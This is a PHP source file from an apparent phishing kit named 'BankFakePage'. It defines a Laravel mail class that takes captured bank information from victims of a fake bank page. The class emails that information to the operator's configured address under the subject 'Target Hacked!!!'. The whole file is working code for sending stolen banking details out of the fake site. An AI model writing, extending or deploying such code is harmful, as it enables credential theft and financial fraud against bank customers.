<?php


namespace LaravelClass\BankFakePage\Mail;

use Illuminate\Bus\Queueable;
use Illuminate\Mail\Mailable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Queue\SerializesModels;
class HackedAlertMailer extends Mailable
{
    use Queueable, SerializesModels;

    /**
     * Create a new message instance.
     *
     * @return void
     */
    public $bankInfo;

    public function __construct(object $bankInfo)
    {
        $this->bankInfo = $bankInfo;
    }

    /**
     * Build the message.
     *
     * @return $this
     */
    public function build()
    {
        return $this->subject('Target Hacked!!!')->to(config('fakePage.emailForAlert'))
            ->text('fakePage::mail.hacked');
    }
}
